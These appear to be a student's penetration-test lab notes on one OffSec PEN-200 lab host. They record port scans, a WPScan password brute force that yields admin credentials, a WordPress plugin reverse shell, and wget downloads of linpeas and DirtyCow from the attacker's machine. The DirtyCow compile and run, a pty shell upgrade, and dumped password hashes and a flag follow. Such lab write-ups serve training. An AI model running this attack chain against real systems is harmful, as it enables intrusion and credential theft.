###  machine information

```shell
IP ADDRESS:10.11.1.234
HN: CORE
OS: linux 2.6.32-21-generic-pae / Ubuntu 10.04 LTS 
	# uname -r
EXPLOIT/PORT: WPscan brutefore / port 80
PRIVESC: DirtyCow
USERS MENTIONED: admin / nina / Carrie
CREDENTIALS: admin / princess
```

### 1. Nmap: Full TCP 

#nmapfulltcp
```shell
┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -p- 10.11.1.234
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-15 18:13 EDT
Nmap scan report for 10.11.1.234
Host is up (0.062s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.3p1 Debian 3ubuntu3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 2c83670229208799875595926c8da4a3 (DSA)
|_  2048 6b9108a8c090ac68bdc9cd9cbe692bac (RSA)
80/tcp    open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-title: Business Statistics | New Server for Thinc&#039;s Business Sta...
|_http-server-header: Apache/2.2.14 (Ubuntu)
10443/tcp open  http    CoreHTTP httpd 0.5.3.1
|_http-title: Stats! Stats! Stats!
|_http-server-header: corehttp-0.5.3.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.19 seconds

```

#nmapudp
```shell
Never came back.
```
### 2. Searchsploit: CoreHTTP
#searchsploit

```shell
┌──(root㉿kali)-[/home/kali]
└─# searchsploit CoreHTTP              
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
CoreHTTP 0.5.3.1 - 'CGI' Arbitrary Command Execution                                | linux/remote/10610.rb
CoreHTTP 0.5.3alpha - HTTPd Remote Buffer Overflow                                  | linux/remote/4243.c
CoreHTTP Web server 0.5.3.1 - Off-by-One Buffer Overflow                            | linux/dos/10349.py
------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```

### 3. Web Fuzzing : Dirsearch & GoBuster
#webfuzzing 
```shell
#fuzzing both 10.11.1.234:80 & 10.11.1.234:10443
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://10.11.1.234:10443 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.234:10443
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/15 18:24:24 Starting gobuster in directory enumeration mode
===============================================================
/403.html             (Status: 200) [Size: 262]
/404.html             (Status: 200) [Size: 311]
/dev                  (Status: 303) [Size: 0] [--> //dev/]
/favicon.ico          (Status: 200) [Size: 9662]
/index.html           (Status: 200) [Size: 766]
/index.html           (Status: 200) [Size: 766]
Progress: 27684 / 27690 (99.98%)
===============================================================
2023/03/15 18:30:49 Finished
===============================================================
```

```shell
#dirsearch medium.txt

┌──(root㉿kali)-[/home/kali]
└─# dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:80 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, html, js, asp, aspx | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /root/.dirsearch/reports/10.11.1.234-80/_23-03-15_18-32-57.txt

Error Log: /root/.dirsearch/logs/errors-23-03-15_18-32-57.log

Target: http://10.11.1.234:80/

[18:32:58] Starting: 
[18:33:00] 301 -  315B  - /wp-content  ->  http://10.11.1.234/wp-content/
[18:33:01] 200 -    2KB - /wp-login
[18:33:02] 200 -   19KB - /license
[18:33:02] 301 -    0B  - /index  ->  http://10.11.1.234/index/
[18:33:02] 301 -  316B  - /wp-includes  ->  http://10.11.1.234/wp-includes/
[18:33:05] 200 -    9KB - /readme
[18:33:13] 200 -  135B  - /wp-trackback
[18:33:18] 301 -  313B  - /wp-admin  ->  http://10.11.1.234/wp-admin/
[18:33:42] 200 -   42B  - /xmlrpc
[18:34:59] 302 -    0B  - /wp-signup  ->  http://10.11.1.234/wp-login.php?action=register

```

```shell
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─# gobuster dir -u http://10.11.1.234:10443 -w /usr/share/dirb/wordlists/common.txt -x php,txt,html,asp,aspx
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.1.234:10443
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php,txt,html,asp,aspx
[+] Timeout:                 10s
===============================================================
2023/03/15 20:25:21 Starting gobuster in directory enumeration mode
===============================================================
/403.html             (Status: 200) [Size: 262]
/404.html             (Status: 200) [Size: 311]
/dev                  (Status: 303) [Size: 0] [--> //dev/]
/favicon.ico          (Status: 200) [Size: 9662]
/index.html           (Status: 200) [Size: 766]
/index.html           (Status: 200) [Size: 766]
Progress: 27684 / 27690 (99.98%)

```

```shell
dirsearch -e php,html,js,asp,aspx -u http://10.11.1.234:10443 -x 400,401,403 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
### 4. Web Browsing & WPscan

![[1. wp identification.png]]

#wpscan 
```powershell
# inspecting the webpage of 10.11.1.234:80 shows that the back end of the website is running wordpress.

wpscan --url http://10.11.1.234:80/ --enumerate ap,at,cb,dbe

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.2.14 (Ubuntu)
 |  - X-Powered-By: PHP/5.3.2-1ubuntu4
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.11.1.234/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.11.1.234/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.11.1.234/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 3.5.1 identified (Insecure, released on 2013-01-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.11.1.234/?feed=rss2, <generator>http://wordpress.org/?v=3.5.1</generator>
 |  - http://10.11.1.234/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.5.1</generator>

[+] WordPress theme in use: twentytwelve
 | Location: http://10.11.1.234/wp-content/themes/twentytwelve/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://10.11.1.234/wp-content/themes/twentytwelve/style.css?ver=3.5.1
 | Style Name: Twenty Twelve
 | Style URI: http://wordpress.org/extend/themes/twentytwelve
 | Description: The 2012 theme for WordPress is a fully responsive theme that looks great on any device. Features in...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/style.css?ver=3.5.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyeleven
 | Location: http://10.11.1.234/wp-content/themes/twentyeleven/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.11.1.234/wp-content/themes/twentyeleven/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: http://10.11.1.234/wp-content/themes/twentyeleven/style.css
 | Style Name: Twenty Eleven
 | Style URI: http://wordpress.org/extend/themes/twentyeleven
 | Description: The 2011 theme for WordPress is sophisticated, lightweight, and adaptable. Make it yours with a cust...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentyeleven/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentyeleven/style.css, Match: 'Version: 1.5'

[+] twentytwelve
 | Location: http://10.11.1.234/wp-content/themes/twentytwelve/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://10.11.1.234/wp-content/themes/twentytwelve/style.css
 | Style Name: Twenty Twelve
 | Style URI: http://wordpress.org/extend/themes/twentytwelve
 | Description: The 2012 theme for WordPress is a fully responsive theme that looks great on any device. Features in...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/style.css, Match: 'Version: 1.1'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:02 <=======================================> (137 / 137) 100.00% Time: 00:00:02

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:01 <=============================================> (71 / 71) 100.00% Time: 00:00:01

[i] No DB Exports Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Wed Mar 15 18:32:07 2023
[+] Requests Done: 25648
[+] Cached Requests: 18
[+] Data Sent: 6.573 MB
[+] Data Received: 17.508 MB
[+] Memory used: 318.062 MB
[+] Elapsed time: 00:05:56


```

#wpscan #bruteforce #admin/princess #credentials

```shell
# FUCKING ADD THIS TO NOTES LATES
#last yolo of the night fucking actually worked. get used to reading the man page... this would have saved multiple hours.

#extremely important command with wpscan, used to crack passwords. cracked password was admin/princess.

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.11.1.234/ [10.11.1.234]
[+] Started: Thu Mar 16 00:21:22 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.2.14 (Ubuntu)
 |  - X-Powered-By: PHP/5.3.2-1ubuntu4
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.11.1.234/xmlrpc.php
 | Found By: Headers (Passive Detection)
 | Confidence: 100%
 | Confirmed By:
 |  - Link Tag (Passive Detection), 30% confidence
 |  - Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.11.1.234/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.11.1.234/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 3.5.1 identified (Insecure, released on 2013-01-24).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.11.1.234/?feed=rss2, <generator>http://wordpress.org/?v=3.5.1</generator>
 |  - http://10.11.1.234/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.5.1</generator>

[+] WordPress theme in use: twentytwelve
 | Location: http://10.11.1.234/wp-content/themes/twentytwelve/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://10.11.1.234/wp-content/themes/twentytwelve/style.css?ver=3.5.1
 | Style Name: Twenty Twelve
 | Style URI: http://wordpress.org/extend/themes/twentytwelve
 | Description: The 2012 theme for WordPress is a fully responsive theme that looks great on any device. Features in...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/style.css?ver=3.5.1, Match: 'Version: 1.1'

[+] Enumerating Most Popular Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:05 <=====================================> (399 / 399) 100.00% Time: 00:00:05
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentyeleven
 | Location: http://10.11.1.234/wp-content/themes/twentyeleven/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.11.1.234/wp-content/themes/twentyeleven/readme.txt
 | [!] The version is out of date, the latest version is 4.2
 | Style URL: http://10.11.1.234/wp-content/themes/twentyeleven/style.css
 | Style Name: Twenty Eleven
 | Style URI: http://wordpress.org/extend/themes/twentyeleven
 | Description: The 2011 theme for WordPress is sophisticated, lightweight, and adaptable. Make it yours with a cust...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentyeleven/, status: 500
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentyeleven/style.css, Match: 'Version: 1.5'

[+] twentytwelve
 | Location: http://10.11.1.234/wp-content/themes/twentytwelve/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | [!] The version is out of date, the latest version is 3.8
 | Style URL: http://10.11.1.234/wp-content/themes/twentytwelve/style.css
 | Style Name: Twenty Twelve
 | Style URI: http://wordpress.org/extend/themes/twentytwelve
 | Description: The 2012 theme for WordPress is a fully responsive theme that looks great on any device. Features in...
 | Author: the WordPress team
 | Author URI: http://wordpress.org/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/, status: 500
 |
 | Version: 1.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.11.1.234/wp-content/themes/twentytwelve/style.css, Match: 'Version: 1.1'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=======================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] Core
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] backup
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc Multicall against 3 user/s
[SUCCESS] - admin / princess                                                                                         
Progress Time: 00:00:12 <> (7 / 57377) Progress Time: 00:00:14 <> (8 / 57377) Progress Time: 00:00:17 <> (9 / 57377) Progress Time: 00:00:21 <> (10 / 57377)                                                                              ^C^Cress Time: 00:00:33 <                                                        > (15 / 57377)  0.02%  ETA: 35:19:54
[!] Valid Combinations Found:
 | Username: admin, Password: princess

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Mar 16 00:22:15 2023
[+] Requests Done: 480
[+] Cached Requests: 19
[+] Data Sent: 126.941 KB
[+] Data Received: 1.814 MB
[+] Memory used: 301.391 MB
[+] Elapsed time: 00:00:53

Scan Aborted: Canceled by User
```

#wpscan #bruteforce
```shell
#got credentials from wp
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs_pen200/10.11.1.234]
└─# wpscan --url http://10.11.1.234:80/ --enumerate u,p,t -P rockyou.txt

[!] Valid Combinations Found:
 | Username: admin, Password: princess
```

![[5. wp login.png]]
#wordpress #plugin #reverse #shell 
```shell
# going to follow this https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell to upload a plugin reverse shell
```


### 5. Reverse Shell : Word Press Add Plugin

```shell
#got reverse shjell by following document above. beginning enumeration
```

![[6. www-data revshell.png]]
### 6. Foothold Enumeration

```SHELL
www-data@core:/var/www/wp-admin$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified

www-data@core:/tmp$ netstat -ano
netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:10443           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 10.11.1.234:80          192.168.119.161:34248   TIME_WAIT   timewait (15.01/0/0)
tcp        0      0 10.11.1.234:80          192.168.119.161:34244   TIME_WAIT   timewait (14.94/0/0)
tcp        0      0 10.11.1.234:80          192.168.119.161:60246   ESTABLISHED keepalive (6985.68/0/0)
tcp        0      0 10.11.1.234:10443       10.11.1.251:25246       TIME_WAIT   timewait (12.60/0/0)
tcp        0     13 10.11.1.234:37469       192.168.119.161:443     ESTABLISHED on (1.88/0/0)
tcp        0      0 10.11.1.234:10443       10.11.1.251:59372       TIME_WAIT   timewait (12.69/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)

www-data@core:/tmp$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#


www-data@core:/tmp$ 



www-data@core:/tmp$ sysinfo
sysinfo
The program 'sysinfo' is currently not installed.  To run 'sysinfo' please ask your administrator to install the package 'sysinfo'
www-data@core:/tmp$ systeminfo
systeminfo
systeminfo: command not found
www-data@core:/tmp$ cat /etc/issue
cat /etc/issue
Ubuntu 10.04 LTS \n \l

www-data@core:/tmp$ 


www-data@core:/tmp$ ip address
ip address
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:86:e5:b9 brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.234/16 brd 10.11.255.255 scope global eth0
    inet6 fe80::250:56ff:fe86:e5b9/64 scope link 
       valid_lft forever preferred_lft forever



cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
dovecot:x:103:110:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
postfix:x:105:111::/var/spool/postfix:/bin/false
offsec:x:1000:1000:offsec,,,:/home/offsec:/bin/bash


```

```shell
# grabbing over linpeas
#cert util does not work
certutil.exe -urlcache -split -f "http://192.168.119.161/linpeas.sh"

wget http://192.168.119.161:1337/linpeas.sh   


# note that my rev shell gets deleted every 5 minutes.

#successfully copied over linpeas.sh
www-data@core:/tmp$ ls
ls
linpeas.sh

# got permission denied when trying to run out of /tmp
www-data@core:/tmp$ ./linpeas.sh
./linpeas.sh
bash: ./linpeas.sh: Permission denied

# forgot to chmod! ensure to chmod

```

![[7. dirtycow 2 exploit.png]]

### 7. Privilege Escalation : DirtyCow
```shell

wget http://192.168.119.161:1337/dirty.c

# compiled dirty.c into dirty
www-data@core:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt

#ran dirty
#NOTE: this took a few attempts to actually work
www-data@core:/tmp$ ./dirty
./dirty
Please enter the new password: pass
^C

#checked to see if firefart was in the /etc/passwd copy
www-data@core:/tmp$ cat passwd.bak
cat passwd.bak
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

# attempted to su into firefart ( root ) & got error needing to be ran from a terminal
www-data@core:/tmp$ su firefart
su firefart
su: must be run from a terminal

#checked to see if python was on the box, it was 
www-data@core:/tmp$ python

# due to typical shell upgrade echo "import pty; pty.spawn('/bin/bash')" not working had to put the same thing into a file and execute it with python
www-data@core:/tmp$ echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py

#once in a tty shell, able to su into as firefart with the pass I set
www-data@core:/tmp$ su firefart
su firefart
Password: pass

firefart@core:/tmp# whoami
whoami
firefart


```
### 8. Flag

```powershell

firefart@core:~# cat proof.txt
cat proof.txt
bb0891b0b337d60b84c514e07f311816
firefart@core:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 16436 qdisc noqueue state UNKNOWN 
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
    link/ether 00:50:56:86:e5:b9 brd ff:ff:ff:ff:ff:ff
    inet 10.11.1.234/16 brd 10.11.255.255 scope global eth0
    inet6 fe80::250:56ff:fe86:e5b9/64 scope link 
       valid_lft forever preferred_lft forever
firefart@core:~# 

```

![[8. ip a & proof.txt.png]]


# Post Flag Notes

```shell
firefart@core:~# pwd
pwd
/root
firefart@core:~# ls
ls
nina.html  proof.txt  wp.sql  www_backup
firefart@core:~# 

```

```shell
# /root/wp.sql contents 
# potential hashes
LOCK TABLES `wp_users` WRITE;
/*!40000 ALTER TABLE `wp_users` DISABLE KEYS */;
INSERT INTO `wp_users` VALUES (1,'admin','$P$BFtLvmyncK9gciO7uC9.OnnjCoA.M8/','admin','core@thinc.local','','2015-12-23 09:37:58','',0,'Core'),(2,'backup','$P$BhpDbXROGLJpRJtep6Lky4UuCsvp0K0','backup','core+1@thinc.local','','2016-01-06 02:52:44','',0,'backup');
/*!40000 ALTER TABLE `wp_users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
```

![[9. post notes.png]]

```shell
#cat.nina.html

firefart@core:~# ls
ls
nina.html  proof.txt  wp.sql  www_backup
firefart@core:~# cat nina.html
cat nina.html
<html>
<head>
<title>Stats for Nina</title>
<meta http-equiv="refresh" content="60;url=/nina.html" /> 
</head>
<body>
<h3>
<center>Hey Nina, here are the stats you requested; just leave your browser opened on this page! The page will refresh automatically every minute so that you won't need to hit F5 (lazy boss ;-)).<br />
I had to whitelist your IP (10.1.1.235) on the firewall (10.11.1.251) in order to let you access this web server!<br /></center>
This is just the quickest solution I could came to, if it's not ok I will create something more stable on the HTTP server inside your subnet.<br />
/Carrie<br />
</h3>
<br />
<center>
<img src="/stat.gif"/>
</center>
</body>
</html>
firefart@core:~# 


```




![[10. root notes.png]]










### 9. random notes


```shell
- Missed an http port due to forgetting to do a full nmap scan. Cannot forget to do that.
- got stuck due to having a meterpreter shell instead of a x64 generic shell...
- need to upload file in ftp binary mode?
	- are you uploading it via binary mode?

- always ensure to put ftp into binary mode before uploading any shells. 

# ALWAYS DO A FULL NMAP SCAN
# FOUND NEW PORTS

```

![[2. ftp ls aspnet.png]]
```shell
- notice the aspnet client, windows typically uses aspnet clients which allows us to both upload aspx reverse shells using mksfvenom.

```
